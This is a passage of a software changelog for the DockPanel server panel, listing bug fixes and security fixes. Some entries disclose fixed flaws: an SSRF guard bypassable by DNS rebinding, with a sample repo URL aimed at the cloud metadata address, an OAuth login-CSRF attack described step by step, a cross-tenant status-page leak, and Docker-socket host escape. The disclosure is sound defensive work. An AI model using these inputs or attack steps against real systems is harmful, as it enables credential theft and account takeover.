+because it's a full host-escape vector regardless of who is allowed to trigger the deploy.
+Checking found Portainer has the identical defect: its web UI starts and serves a login page
+fine with no socket, then every real feature behind it silently fails, which is why the
+weekly Template Census's start/respond check never caught it the way Dozzle's crash-loop did.
+The same policy is enforced independently at the Compose-stack level too — both the backend's
+YAML validation and the agent's resolved-path check block a socket mount there as well, plus
+host-root and a few other sensitive paths — so there is no supported way to run a
+Docker-socket-dependent tool through DockPanel at all. Both templates are withdrawn from the
+catalogue (148 → 146) rather than left broken, or granted an escape hatch that would reverse a
+deliberate security decision.
+
+## [2.177.0]
+
+### A second dead column rode along with the one already found and fixed on the same table
+
+`backup_destinations.encryption_enabled` was added in the same migration and the same
+`ALTER TABLE` as `encryption_key` — the column found dead and fixed in v2.24.0, when restore
+was found to be reading a key nothing ever wrote. That fix documented `encryption_key`'s
+deadness at three call sites; `encryption_enabled` had zero readers, zero writers, and no
+comment anywhere, and rode along unexamined through both that fix and a second pass on this
+table, because nothing named it as a thing to check. It's harmless today (0 backup
+destinations configured on demo.dockpanel.dev, so nothing could have gated on it) — DockPanel
+encrypts per-policy (`backup_policies.encrypt`), with one key derived from the process JWT
+secret, never per-destination, so neither column was ever going to be wired to anything. Now
+documented directly above the `BackupDestination` struct, the same defence already used for
+excluding `config` from `SelectableDestination`, so a future reader has a reason to check
+before reintroducing either field.
+
+An independent fan-out audit of `secrets.rs`'s ownership-scoping axis (Secrets Manager vault
+CRUD, versioning, site auto-injection, export/import) found this table's scoping clean —
+13/13 handlers correctly scoped, including the two adjacent files (`deploy.rs`'s auto-inject,
+`sites.rs`'s ownership transfer) that share the same invariant. No change needed there.
+
+## [2.176.1]
+
+### The billing webhook wrote a stricter server limit for paying customers than free users got by default
+
+Migration `20260313100000_remove_billing_enforcement.sql` deliberately set
+every account's server limit (and the column's own default) to unlimited —
+but the webhook kept writing the old tier-specific numbers (1/5/20) on every
+checkout and plan change, so a real Stripe subscriber ended up with a
+*lower* recorded limit than a brand-new free signup. Harmless today since
+nothing reads the column, but it would have inverted the moment enforcement
+was ever restored. The webhook no longer writes `plan_server_limit` at all —
+the column is fully owned by its schema default now, matching the
+enforcement-removal migration's own decision instead of quietly fighting it.
+
+## [2.176.0]
+
+### A Customer Portal plan change silently desynced Stripe billing from what a customer actually paid
+
+`customer.subscription.updated` determined a customer's plan tier from
+`metadata.plan`, a value stamped once at the *original* checkout and never
+touched again. Upgrading or downgrading through Stripe's self-service
+Customer Portal changes the subscription's price but not its metadata — so a
+portal-driven plan change permanently recorded the *old* plan (and its old
+server limit) with no reconciliation ever correcting it. The webhook now
+resolves the plan from the subscription's current price against the
+admin-configured `stripe_price_{plan}` settings, falling back to metadata
+only when no configured price matches.
+
+### Two of three Stripe API calls in the billing flow ignored Stripe's own error responses
+
+Creating a Stripe customer and opening the Customer Portal both read a
+success field (`id` / `url`) straight off the response without first checking
+for Stripe's `error` key — a 4xx from Stripe (e.g. a deleted customer)
+degraded to a generic "missing customer id" / "missing portal URL" 502
+instead of surfacing the actual cause. Both now check for `error` first,
+matching the pattern the checkout-session call already used.
+
+### Starting checkout while already subscribed could spawn a second Stripe subscription
+
+`create_checkout` never checked whether the caller already had an active
+subscription before starting a new one — an upgrade click (or an accidental
+double-click) could create a second Stripe subscription and desync the
+recorded `stripe_subscription_id`. It now rejects with 409 when a
+subscription is already on file, pointing the caller at the Customer Portal
+to make changes instead.
+
+Found by a fan-out audit-coverage pass on `billing.rs` — this Stripe
+integration had never had a dedicated review before this session.
+
+## [2.175.0]
+
+### Installing PowerDNS on a second server silently overwrote the first server's credentials
+
+`install_powerdns` is per-server (the same class as Redis, Fail2Ban and
+Cloudflare Tunnel), but the API URL and key it saves live in the panel's
+global settings — nothing recorded which server they belonged to. Installing
+PowerDNS on a second managed server overwrote the first server's saved
+credentials with no warning, silently pointing every existing PowerDNS DNS
+zone at the wrong authoritative server. Installing now records which server
+owns the saved credentials and refuses a second install elsewhere with a
+clear error naming that server; uninstalling frees the slot again (but only
+when uninstalling from the server that actually owns it, so it can't be used
+to steal another server's live credentials).
+
+### Downloading an SBOM regenerated it from scratch every time, even seconds after the last download
+
+The "Download SBOM" button always ran a fresh syft scan (2-4 minutes) even
+when a just-generated document already existed — the fast, cache-serving
+endpoint built for exactly this existed but the button never called it. It
+now serves the stored SBOM instantly when one exists, falling back to a full
+scan only when none is stored yet. A new "Regenerate" button sits next to it
+for forcing a fresh scan on demand.
+
+### Also
+
+- Removed `sbom_enabled`, a settings row seeded in v2.7.11 that nothing ever
+  read or wrote — SBOM availability is actually driven by whether syft is
+  installed, not this row.
+
+## [2.174.0]
+
+### A vulnerable container image found nothing but a row — and a fixed security scan never told the dashboard it was fixed
+
+A fan-out audit of the image-scan / SBOM / security-scan surface found an
+earlier ownership-scoping fix still intact, but surfaced two real gaps
+nothing since had noticed:
+
+A critical or high-severity vulnerability discovered in a running container
+image — whether by the manual "Scan" button, a deploy-triggered scan, or the
+30-minute background sweep that runs against every fleet member — was
+written to `image_scan_findings` and nowhere else. No alert fired, nothing
+appeared in the firing count, and the only way to notice was opening the Apps
+page and reading the badge. Image scans now fire through the same alert
+pipeline the full-server security scanner already used, keyed per
+`(server, image)` so two images never resolve or suppress each other's alert,
+and clear themselves the same way once a later scan comes back clean. New
+`image_scan` type in Settings → Notifications, so it can be muted like every
+other alert.
+
+Separately — found by the audit's completeness pass, not by the topic it was
+assigned — clicking "Run Scan" on the Security page to confirm a fix never
+cleared the alert the earlier, dirty scan had raised. The scheduled weekly
+scan always resolved a stale firing alert before deciding whether to raise a
+new one; the manual path never did, so a clean manual rescan left the
+dashboard's firing-alert badge and its -15 health-score penalty stuck for up
+to 7 days, until the next scheduled scan happened to run — while the
+scan-history tiles right next to it, which read the scan table directly,
+updated instantly. The two halves of the same dashboard card disagreed with
+each other after every manual rescan that fixed something. Both paths now
+resolve before they decide whether to fire.
+
+Also: `FEATURES.md`'s Background Services table listed the security scanner
+as running `daily`; it has run `weekly` since v2.58.0, and `SECURITY.md` said
+so correctly the whole time — a docs/docs contradiction in the same repo that
+no test caught.
+
+## [2.173.1]
+
+### API shutdown is now bounded — a stuck deploy no longer waits the full systemd kill window
+
+A real deploy on this box measured the API taking the full ~90s systemd
+default `TimeoutStopSec` (unset in our unit) to stop on SIGTERM, because
+`axum::serve(...).with_graceful_shutdown(...)` waits for every in-flight
+connection to close on its own — an open SSE stream or WebSocket terminal
+session blocks that indefinitely. Fixed by arming a hard watchdog inside
+`shutdown_signal()` once the signal has actually fired: it sleeps 20s, then
+forces the process to exit if the drain (plus the background-service
+shutdown and DB-pool close that follow it) hasn't finished on its own. A
+first fix attempt — wrapping the whole `axum::serve(...)
+.with_graceful_shutdown(...)` future in a `tokio::time::timeout` — was caught
+in review before shipping: that future runs for the server's entire uptime,
+so timing out the whole thing would have force-exited the process ~20s after
+every single boot, shutdown or not. The corrected version only starts its
+clock once the shutdown signal has resolved. Verified live on a throwaway
+VPS under the same unmodified systemd unit as production: SIGTERM with a
+held-open connection went from 90s to 20s exactly (confirmed via journal
+timestamps), while a normal shutdown with no open connections stayed a fast
+~2s, and the server was independently confirmed to stay up and healthy well
+past the 20s bound with no shutdown signal sent at all.
+
+## [2.173.0]
+
+### No site of any runtime — static, PHP, Node, Python, proxy — could ever be created on the RHEL family
+
+A carried tech-debt note claimed PHP's own readiness check (`settle()`) was a
+false positive on RHEL. It was not — `php.rs`'s socket check already knew
+about RHEL's unversioned PHP-FPM socket (`/run/php-fpm/www.sock`, one per
+box, versus Debian's `/run/php/php{version}-fpm.sock`). The real gap was one
+layer downstream: `nginx.rs::put_site()` validated and existence-checked the
+PHP socket as a literal Debian-shaped path with no RHEL fallback, so creating
+a PHP site was refused with "PHP {version} is not installed, or its PHP-FPM
+service is not running" even when PHP-FPM was genuinely installed and
+running. Fixed by `services::pkg::resolve_php_fpm_socket()`, the single
+resolver both `php.rs::socket_exists()` and `nginx.rs::put_site()` now share.
+
+Fixing that exposed a second, much larger defect one step further in: nginx's
+own vhost directory. Debian ships `sites-available`/`sites-enabled`; the RHEL
+family's nginx package has **neither** — `nginx.conf` there includes only
+`conf.d/*.conf`. Roughly 25 call sites across a dozen files — the vhost
+writer itself, SSL provisioning, git-deploy cleanup, Docker Apps, the WAF
+uninstaller, the security scanner, diagnostics, and the Infrastructure-as-Code
+exporter — each hardcoded the Debian path independently, so every one of them
+failed on RHEL regardless of which runtime a site used. `setup.sh` already
+detected this correctly for the *panel's own* vhost; no site vhost writer
+shared that detection. Fixed by `services::nginx::sites_dir()`, mirroring
+`setup.sh`'s own `[ -d /etc/nginx/sites-enabled ]` check, with every call site
+now reading the one shared decision instead of its own copy. The
+disable/enable (park) mechanism follows the same fix: RHEL has no second
+directory to park a disabled vhost in, so the live and parked files now share
+`conf.d`, distinguished by a `.disabled` suffix nginx's own glob cannot match.
+
+**Live-fire proof, both defects, one real Rocky Linux 9.8 box, one command:**
+published v2.172.0 refused with "PHP 8.3 is not installed"; the socket fix
+alone got past that and failed with "Failed to write config: No such file or
+directory"; both fixes together created the site, wrote its vhost to
+`/etc/nginx/conf.d/phptest2.example.com.conf`, passed `nginx -t`, and served
+real PHP — `curl` returned `PHP_WORKS:8.3.33` with `X-Powered-By: PHP/8.3.33`
+over HTTP 200. Disable/enable re-driven on the same site: the parked file
+landed at `{domain}.conf.disabled` in the same directory, the maintenance
+page served after a reload settled, and PHP output returned unchanged after
+re-enabling.
+
+27 new pin assertions in `rhel-site-creation-pin-e2e.sh`, mutation-tested
+against the pre-fix source: 28 of the 31 new/changed arms went red, the 3
+staying green are deliberate positive controls (the pre-existing Debian-only
+per-site pool degrade, and `mail.rs`'s own pre-existing dual-path check for
+the panel's vhost, which already got this right).
+
+## [2.172.0]
+
+### Security — the uptime check's redirect-hop SSRF guard had the same check-then-reconnect gap v2.166.0 closed for the initial request
+
+v2.166.0 closed a DNS-rebind TOCTOU at 9 SSRF-guarded call sites by pinning
+each connection to the exact address `resolve_validated` had just approved —
+except the uptime HTTP check's redirect-following, which was tracked
+separately as harder: it still re-validated each hop with a synchronous,
+blocking check (`host_resolves_internal_blocking`) and then let reqwest
+resolve the hop's hostname AGAIN, independently, to make the actual
+connection. A DNS server that answered those two lookups differently — a
+rebind, or simply a low TTL between the redirect-policy decision and the
+connect — sailed through unseen, on any redirect a monitored URL could send.
+
+Closed by installing `helpers::ValidatingResolver`, a `reqwest::dns::Resolve`
+implementation, as the uptime check's client-wide DNS resolver. It shares its
+internal-address classifier (`resolve_all_validated`) with `resolve_validated`
+rather than duplicating the rule, so validation and resolution are now the
+SAME lookup for every hop, not two — there is nothing left to race. The
+existing synchronous per-hop check stays in place alongside it: a redirect
+`Location` that is already a literal internal IP never reaches a `Resolve`
+implementation at all (the connector dials a literal IP directly), so that
+check is still the only thing that catches that shape.
+
+### Tests
+
+`ssrf-url-guard-pin-e2e.sh` gains §E (8 → 12): the resolver is wired into the
+uptime client's builder, its own `resolve()` calls the real validator rather
+than a stub, the pre-existing synchronous check is still present alongside it
+(not replaced by it), and the validator is the shared core for both the
+initial request and every redirect hop rather than a second, divergable copy.
+Mutation-tested against the pre-fix file: 3 of the 4 new arms went red, and the
+"synchronous check still present" arm correctly stayed green in both states,
+confirming it isolates the ADDITION rather than testing something already
+true. Three new Rust unit tests exercise `ValidatingResolver` through the
+actual `reqwest::dns::Resolve` trait method on its literal-IP branch (no
+network I/O, so no CI flake risk) — the DNS-dependent branch is exercised live
+by the uptime check itself, same as `resolve_validated`/`pinned_client`,
+neither of which has a dedicated unit test for the same reason.
+
+### Security — the public status page could serve one tenant's data to a visitor of another's
+
+`GET /api/status-page/public` (unauthenticated, what `/status` fetches) picks
+one `status_page_config` row to answer as, then read every other table it
+needs — `status_page_components`, the monitors joined into them,
+`managed_incidents`, `incident_updates`, and the legacy monitor-based
+`incidents` table — with **no tenant filter at all**. On a single-tenant box
+this is invisible: the one config row is the only data there is to leak. On
+any multi-tenant or reseller install — DockPanel's stated target market, with
+`teams`, `resellers` and `reseller_dashboard` all built for exactly that — a
+second tenant's components and incident history would be served on the
+FIRST tenant's public page the moment that second tenant configured and
+enabled a status page of their own. Found by the s418 audit's setup critic,
+who traced it to a finding already on record from s251 (2026-07-25) that
+survived an adjacent edit (v2.70.0) to the very same function without being
+closed. All five queries in `public_status_page` are now scoped to the
+config-winning row's `user_id`; when no tenant has configured a status page
+at all, the handler now answers with empty components/incidents instead of
+whatever happened to be in the tables. Regression-pinned:
+`status-page-gate-pin-e2e.sh` §G, mutation-tested both directions (reverting
+any one of the five queries to its unscoped form turns its own arm red, and
+only that one).
+
+### Security — OAuth login could be redirected into an attacker's account (login-CSRF)
+
+`/api/auth/oauth/{provider}/callback` validated its `state` parameter only
+against the server-side map `authorize` had written it into — which proves
+*some* `/authorize` call produced it, nothing about *which browser* is
+presenting it now. An attacker could start their own OAuth flow, capture the
+provider's redirect back to this panel (a real `code`+`state` pair for the
+attacker's own account) without letting their own browser follow it, and hand
+that exact callback URL to a victim: the old check would accept it and log
+the victim's browser into the **attacker's** account. `authorize` now sets a
+short-lived `HttpOnly`, `SameSite=Lax` cookie carrying the same state value;
+`callback` requires it to be present and to match `query.state` before
+anything else runs.
+
+Separately, an OAuth provider's own `email_verified: false` was never
+checked before its `email` was used to auto-link to (or auto-log into) an
+existing local account by email match alone. Google's OIDC userinfo endpoint
+(the one this panel calls) does return that field; it was read nowhere.
+Absent-field providers (GitLab's user endpoint, GitHub's profile-email path)
+are unaffected — the gate defaults to allow when the field isn't sent, and
+rejects only an explicit `false`.
+
+Both found by the s418 identity/access-control audit fan-out (finder +
+independent adversarial skeptic, both UPHELD against source). Regression-pinned
+in a new suite, `oauth-csrf-pin-e2e.sh`, mutation-tested both directions.
+
+### Changed — an advertised capability withdrawn
+
+Recorded in `FEATURES.md` § Withdrawn Claims rather than quietly deleted.
+
+**Terraform/Pulumi IaC tokens** — advertised since Tier 3 as "scoped tokens,
+resource listing" — are CRUD-only and authenticate nothing. All 6 handlers
+(token create/list/delete, `tf_list_sites`, `tf_list_databases`, and the 4
+autoscale handlers sharing this file) take only `AuthUser` (JWT);
+`iac_tokens.token_hash` is written once at creation and read back by no code
+path anywhere in the tree — confirmed live against `demo.dockpanel.dev`, a
+real token 401s identically to a garbage string. The module's own doc
+comment claimed "Authentication via IaC tokens (Bearer token) or regular
+JWT" and named `dns_records` as a resource; neither was ever true — no
+`dns_records` reader has ever existed, only `sites` and `databases` are
+real. There is no frontend for it at all: the only `Terraform`/`Pulumi`/`iac`
+hit in the whole SPA is a command-palette search keyword. `iac_tokens` has
+zero rows on this box — zero real-world adoption, ever. Same defect shape as
+the API Keys withdrawal below (write-only credential), but this one had
+never been disclosed anywhere until found by the s418 audit fan-out's
+completeness critic, checking the one file none of the session's four picked
+audit topics had covered.
+
+## [2.170.0]
+
+### Fixed — a parked (stopped) Compose stack's vhost and certificate could never be cleaned up
+
+`unexpose_domain`'s ownership check needs a container's published port to
+prove a vhost is still fronting it before deleting the vhost and its
+certificate. Single-app removal (`removal_identity`) has always sourced this
+correctly — a fresh `inspect_container` call, reading the port from
+`HostConfig.PortBindings`, which survives a stop. Stack removal took a
+different, weaker path: `DeployedApp.port`, sourced from Docker's
+`list_containers` API, which only reports a *live* (currently bound) port —
+empty the moment a stack is stopped ("parked"). A parked-then-removed stack
+could therefore never prove ownership of its own vhost, and the vhost and
+certificate were left behind permanently, with no later panel action able to
+recover them (the container that would have proven it is by then gone too).
+
+Added `docker_apps::inspect_host_port`, the same `HostConfig`-based lookup
+`removal_identity` already used, callable from just a container id. Stack
+removal now calls it instead of relying on the live listing.
+
+## [2.169.0]
+
+### Security — a git deploy's `repo_url` had no SSRF guard at all
+
+Every other place the panel accepts an operator-supplied URL — monitors,
+webhooks, extensions, escalation policies — validates it against
+`validate_url_not_internal` before ever connecting. `git_deploys.repo_url`
+never did: an admin could point a deploy's clone target at
+`http://169.254.169.254/...` or any other internal address, and the agent
+would `git clone` it directly.
+
+Reusing `validate_url_not_internal` unmodified wasn't possible: it refuses
+any URL carrying credentials in the authority outright, and a legitimate
+repo URL routinely carries one (`https://x-access-token:TOKEN@github.com/
+owner/repo.git`). It also only accepts `http`/`https`, while the agent's own
+clone gate (`is_valid_repo_url`) additionally allows `ssh://` and the
+scp-like `git@host:path` shorthand — neither of which an ordinary URL
+parser can read as an authority at all.
+
+Added `helpers::validate_repo_url_not_internal`: tolerant of embedded
+credentials, understands all four repo-url shapes, and reuses the same
+`validate_host_not_internal` internal-address check every other SSRF guard
+in the panel already shares. Wired into both `create` and `update`.
+
+## [2.168.0]
+
+### Added — Git Deploys can serve a registered certificate, not just Let's Encrypt
+
+Until now a git deploy's only route to HTTPS was letting the panel order a
+Let's Encrypt certificate, and the sole signal for "this deploy wants TLS at
+all" was whether an SSL email happened to be present — the same shape
+already closed for Docker Compose stacks and template apps in v2.160.0. A
+git deploy can now serve a certificate registered once under Monitoring →
+Certificates instead: pick **Registered certificate** for HTTPS in the
+create/edit form (or send `tls_mode`/`tls_certificate` to the API), and every
+deploy — first deploy, redeploy, and preview environments — resolves and
+re-validates it fresh rather than trusting a stored assumption.
+
+The certificate must actually cover the domain; a mismatch is refused rather
+than served. If it can't be applied at deploy time (removed since, or no
+longer covers the domain), the deploy still succeeds — the container comes
+up — but the domain is served over plain HTTP and a warning names why,
+never a silent downgrade. On a redeploy of an already-running container the
+existing HTTPS vhost is left untouched unless the domain itself changes
+(zero-downtime redeploys only swap the backend port, so a certificate that
+was already live is never re-rendered, let alone lost). An agent older than
+v2.160.0 does not understand a registered certificate at all; `provided`
+mode is refused up front on such a server rather than silently falling back.
+
+## [2.167.0]
+
+### Fixed — mail server install failed on Dovecot 2.4+ distros (e.g. Debian 13)
+
+Dovecot 2.4 rewrote its settings file format with no compatibility mode: a
+2.3-style config fails `dovecot -n` outright rather than degrading. The
+generated `/etc/dovecot/conf.d/99-dockpanel.conf` used the pre-2.4 syntax
+unconditionally, so on any distro shipping Dovecot 2.4+ (Debian 13 ships
+2.4.1), the mail installer wrote a config Dovecot immediately refused to
+load, and the mail server never started (reported in #124).
+
+The installer now detects the installed Dovecot version (`dovecot
+--version`, asked fresh at install time rather than inferred from the
+distro) and generates the matching syntax: `mail_driver`/`mail_path` in
+place of `mail_location`, named `passdb passwd-file {}` / `userdb
+passwd-file {}` blocks with a `fields {}` sub-block in place of the old
+driver/args form, and `ssl_server_cert_file`/`ssl_server_key_file` in place
+of `ssl_cert`/`ssl_key`. Two further Dovecot 2.4 defaults that only surface
+during actual mail delivery (not at daemon start or IMAP login) are also
+overridden: the stock Debian package's `protocol lmtp { auth_username_format
+= %{user | username | lower} }` silently stripped the domain from the LMTP
+delivery lookup against a passwd-file keyed by full address, and the new
+`mail_inbox_path` setting defaults to a legacy `/var/mail` mbox spool the
+delivery agent has no permission to create.
+
+Verified end to end on a fresh Debian 13 box: reproduced the exact reported
+failure (`doveconf: Fatal: ... mail_location: Unknown setting`, exit code
+89) on the published v2.166.0 binary, then confirmed the fix on a second,
+untouched Debian 13 box driven entirely through the panel's own API — mail
+install, domain creation, mailbox creation, a real IMAP login, and a real
+SMTP-to-LMTP delivery landing in the mailbox's maildir.
+
+Distros still shipping Dovecot 2.3 (Debian 12, Ubuntu 24.04, Rocky/Alma 9
+as of this release) are unaffected — they continue to get the syntax that
+has always worked for them.
+
+## [2.166.0]
+
+### Security — a resolved-then-reconnected SSRF guard could be bypassed by DNS rebinding
+
+`validate_url_not_internal`/`validate_host_not_internal` correctly rejected a
+literal or resolved internal address, but every one of the 9 call sites then
+made the real connection by asking the HTTP client / `TcpStream` / `ping`
+binary to resolve the same hostname AGAIN, independently. A DNS server that
+answers the validation lookup and the connect lookup differently — a classic
+rebind, or simply a low TTL — sails straight through: the guard and the
+connection were never provably looking at the same address.
+
+Added `helpers::resolve_validated` (same internal-address check, but returns
+the ONE address it approved) and `helpers::pinned_client` (a `reqwest::Client`
+whose resolver is hard-overridden to that exact address via the builder's
+`.resolve()`). Every affected call site now pins the connection to the
+validated address instead of re-resolving: the uptime monitor's HTTP/TCP/ping
+checks, the notification webhook sender, both extension-webhook delivery
+paths (including the event-bridge retry loop), the webhook-gateway forwarder
+(pinned once and reused across its up-to-11 retry attempts, not re-resolved
+per attempt), and both admin "send a test webhook" endpoints.
+
+The uptime HTTP check's redirect-following policy still re-validates each hop
+independently and is not yet pinned — that needs a custom DNS resolver rather
+than the builder-level override used for the initial request, and is tracked
+separately.
+
+### Fixed — a registered (uploaded, non agent-managed) certificate nearing expiry raised no alert
+
+`check_ssl_expiry` only ever read `sites.ssl_expiry`, and `check_stack_ssl_expiry`
+(v2.165.0) deliberately skips a `provided`-mode stack's `ssl_expiry` — correctly,
+since that isn't the panel's certificate to alert on. But nothing read the
+registered certificate's OWN expiry (`tls_certificates.not_after`) either, so a
+certificate uploaded through the registry and actively serving a stack could
+run out with zero warning. A new `check_registered_cert_expiry` closes it,
+scoped to certificates a stack is currently serving, reusing the same
+30/14/7/3/1-day ladder, toggle and setting every other certificate alert uses.
+
+### Fixed — a Traefik-routed deploy could be told a registered certificate would be refused, then get one anyway
+
+`TlsIntent::from_request` validates the requested TLS shape before any
+container is created — except `provided` mode combined with Traefik routing,
+which was only caught afterward, inside `expose_domain`'s Traefik branch, by
+which point the container was already running. Traefik's file provider has no
+per-route certificate form, so the combination can never be honoured; it is
+now refused at the same front door as every other unhonourable combination
+(a bad alias, a missing `ssl_email`). Not reachable through the panel today
+(single-app deploys don't yet expose `tls_mode` in the UI), so this closes the
+gap before it becomes reachable rather than fixing a live defect.
+
+### Fixed — a parked-then-removed Compose stack could leave its nginx vhost pointing at deleted certificate files
+
+Stopping a stack empties Docker's reported port for its containers, so
+`unexpose_domain` correctly leaves the vhost in place (it cannot prove
+ownership without a port) — but the certificate-directory delete right below
+it was gated on a DIFFERENT check, one that explicitly excludes the domain's
+own still-standing vhost from counting as "in use." So a parked-then-removed
+stack ended up with its certificate deleted while the vhost that named it
+survived — breaking `nginx -t` for the whole server at the next reload for
+any unrelated reason. The certificate delete is now also gated on the vhost
+having actually been removed this same call.
+
+### Fixed — `slow_response` and `security` alerts silently skipped notifications, escalation and mutes
+
+Both alert types wrote directly to the `alerts` table instead of going
+through the standard fire/resolve helpers — so a firing `slow_response` alert
+(or a resolving `security` alert) produced a row on the Alerts page but no
+bell notification, no email/Slack/Discord delivery, no escalation paging, and
+could not honour a configured per-type mute, even though both types are
+listed as mutable in Settings. Both now route through the standard helpers
+(`slow_response`'s own dedup guard is preserved as a separate check ahead of
+the call; `security`'s acknowledged-row bookkeeping — which nothing notifies
+on either way — stays a narrow, explicitly-scoped update).
+
+### Added — template apps can request a registered certificate, the same way Compose stacks already can
+
+The agent's `/apps/deploy` has accepted `tls_mode`/`tls_certificate` since
+`TlsIntent` was built for stacks, but the panel never sent them for a template
+app — every deploy was stuck inferring TLS from `ssl_email` presence alone, so
+`provided` mode could never be requested. `POST /api/apps/deploy` now accepts
+the same fields and reuses stacks' own mode-validation (`requested_tls_mode`,
+`plan_tls`) so a template app gets the identical alias-grammar, registry
+lookup and SAN-coverage check a stack deploy already gets. `external_tls: true`
+keeps working as a back-compat alias for `tls_mode: "none"`.
+
+### Added — a Stacks edit screen
+
+`PUT /api/stacks/{id}` (redeploy with domain/TLS replanning and automatic
+rollback if no service in the new definition stays running) existed on the
+backend with no frontend caller. An Edit button on each stack now opens a
+modal — the same field set the create modal already collects, prefilled from
+`GET /api/stacks/{id}` — and surfaces the endpoint's own rollback/refusal
+messages inline.
+
+## [2.165.0]
+
+### Added — Docker Compose stacks now get the same SSL expiry warning ladder and dashboard visibility a site already had
+
+A stack's certificate (`docker_stacks.ssl_expiry`) had no approaching-expiry
+warning at all — the only stack-side SSL alert was `ssl_renewal_failure`,
+raised *after* a renewal attempt actually failed. A stack whose cert was
+simply getting close to expiry, with no failed renewal yet, raised nothing in
+the panel's own alert system. The day-count ladder that already pages a site's
+owner at 30/14/7/3/1 days out (`alert_engine::check_ssl_expiry`) now has an
+ACME-mode-only sibling for stacks, reusing the identical rung logic and the
+same `alert_ssl_expiry` toggle and `ssl_warning_days` setting a site's
+certificate already uses — no new switch to configure.
+
+The dashboard's SSL tile, health score and smart recommendations were also
+blind to stacks — all three read only the `sites` table. They now share one
+merged list with the site certificates, so a stack's expiring certificate
+shows up on the dashboard, counts against the health score and produces a
+recommendation exactly the way a site's does.
+
+The per-caller certificate list (`GET /api/monitors/certificates`) also
+gained its own Docker stacks — its `stack_id` field has carried `null` on
+every row since the admin certificate list learned to populate it, with
+nothing behind it; this was the missing half of that wiring.
+
+## [2.164.0]
+
+### Fixed — a Compose stack's certificate renewal failure never reached the certificate list
+
+A stack's `ssl_renewal_failure` alert carries `site_id = NULL` — there is no
+`sites` row to name — and is keyed instead by server and domain. The admin
+certificate list's renewal-failure lookup filters `site_id = ANY(...)`, which
+a NULL site id can never satisfy, so a stack's certificate always read as
+critical/warning/ok on the clock alone, never `renewal_failed`, no matter how
+long its renewal had actually been failing. The list now runs a second,
+sibling lookup scoped by server and the same state key the renewal job raises
+its alert under, and both the live and offline halves of the admin
+certificate list consult it.
+
+### Fixed — a mail host with no site could be refused with nobody told
+
+Auto-provisioning a mail host's certificate already refused rather than
+replace a foreign or wildcard-covering one. When the mail domain belonged to a
+`sites` row, that refusal raised an alert; when it belonged to a Compose stack
+or Docker app instead — which can never own a `sites` row — the alerting
+function's non-optional site id and owner meant that population could only be
+logged, never alerted on. The refusal itself was always correct; only the
+notification was missing. The site id is now optional, and the admin who
+configured the mail domain's DNS stands in as the alert's owner when there is
+no site to attribute it to.
+
+### Fixed — two Compose stacks could share a name, with no signal to either operator
+
+The migration that scoped `docker_stacks.name` uniqueness to server and user
+dropped the table's original global constraint and never added the scoped
+replacement, unlike the two sibling columns fixed in the same file. A stack's
+own Docker-level isolation is keyed by its id, not its name, so this was never
+a collision risk at the container level — only a list that could show two
+identical rows with nothing but the URL to tell them apart. Existing
+duplicates, if any, are renamed by creation order on upgrade; a new duplicate
+is now refused with a clear "A stack with this name already exists".
+
+### Fixed — a doc-truth gate that never checked two of its own claims
+
+`docs-claims-pin-e2e.sh` declared "Frontend pages" and "DB migrations" as
+published nowhere but the register — but `CONTRIBUTING.md`'s own repo-structure
+diagram had quoted both the whole time, and had drifted: 48 pages against a
+real 53, 118 migrations against a real 118 (now 119). Five sibling counts on
+the same diagram, none register-tracked, had drifted further still and are
+corrected in the same commit. Both metrics are now checked against
+`CONTRIBUTING.md` like every other surface that publishes them.
+
+### Fixed — the marketing site's own template count was the one figure nothing verified
+
+`website/client/src/measurements.ts` claims every other page derives its
+count of Docker app templates from — its own docstring claims the pin suite
+would catch a disagreement. Nothing did: the suite's prose-claim scanner
+matches "148 templates" and the file spells it "templates: 148", and the
+register's surface map for that metric didn't list the file at all. It is now
+mapped like every other surface.
+
+## [2.163.0]
+
+### Fixed — a DNS-01 wildcard renewal asked about the wrong certificate
+
+The manual/scheduled renewal door's foreign-certificate guard checked
+`site.domain`, but a DNS-01 renewal orders against `subject` — the Cloudflare
+zone apex for a wildcard, recorded at issuance — never `site.domain`. The
+agent resolves the status check to a literal `/etc/dockpanel/ssl/<domain>/`,
+and a wildcard child typically has no directory of its own there, so the guard
+always answered "no certificate here" regardless of what actually sat at the
+zone apex about to be overwritten. A foreign wildcard certificate installed at
+the apex — a purchased certificate, a Cloudflare Origin CA certificate — was
+invisible to the exact check built to protect it. It now asks about the name
+the order is actually about to write.
+
+### Fixed — running a manual security scan silently disabled automatic renewal for a week
+
+The scheduled weekly scanner skips a host once any `security_scans` row for it
+is `completed` within the last 7 days — it does not distinguish who triggered
+the scan. `POST /api/security/scan` (the panel's "Scan" button) marked its own
+row `completed` without ever running the auto-fix pass that renews expiring
+SSL and Compose-stack certificates, so an administrator clicking Scan bought
+that host up to a week with no automatic renewal, for nothing. The manual door
+now runs the same auto-fix pass the scheduled one does.
+
+### Added — a way past a foreign-certificate refusal, from the panel itself
+
+Provisioning over a certificate this product did not issue has refused since
+2.162.0, correctly — but the only way past it was `dockpanel ssl provision
+--force` on the CLI, with the panel's own *Provision SSL* button offering no
+path forward at all. The agent's refusal was always labelled; nothing between
+it and the browser carried the label past a sentence. It now does, end to end,
+and the panel shows the refusal with the certificate's issuer and an explicit
+**Replace it anyway** confirmation — the same deliberate step the CLI's
+`--force` requires, on both the HTTP-01 and DNS-01 provision doors.
+
+## [2.162.0]
+
+### Security — every ACME order now asks whose certificate it is about to replace
+
+`provision_cert` writes `fullchain.pem` and `privkey.pem` into
+`/etc/dockpanel/ssl/<domain>/` unconditionally, so an ACME order aimed at a
+domain that already carries somebody else's certificate does not refresh it — it
+**destroys** it. A purchased wildcard, a Cloudflare Origin CA certificate, a
+corporate PKI certificate: replaced with a ninety-day Let's Encrypt one, and for
+a domain that cannot answer the challenge from this box the order then fails and
+leaves neither.
+
+Twenty-six reachable paths in this product order a certificate. **Three of them
+asked.** The rest — Compose stack create, update and rollback; template-app and
+Git deploys, including the unattended rollback watchdog and the scheduled and
+webhook deploys; `dockpanel ssl provision`, `dockpanel sites create --ssl` and
+both halves of `dockpanel apply`; and the panel's own *Provision SSL* button —
+did not. The census that was supposed to enumerate them had been short twice.
+
+**The question is now asked where all twenty-six converge**, inside the two
+functions that write the file, so a path added tomorrow inherits the guard
+without anyone having to remember. It fails closed: a caller that supplies no
+options at all — which is how the deploy paths call it — refuses. Doubt still
+proceeds: no certificate on disk, an unreadable file or an issuer the parser
+cannot produce are all "not proven foreign", because refusing on doubt is how a
+real certificate lapses and a site goes dark.
+
+`dockpanel ssl provision --force` replaces one deliberately, after the refusal
+has named the issuer that would be lost.
+
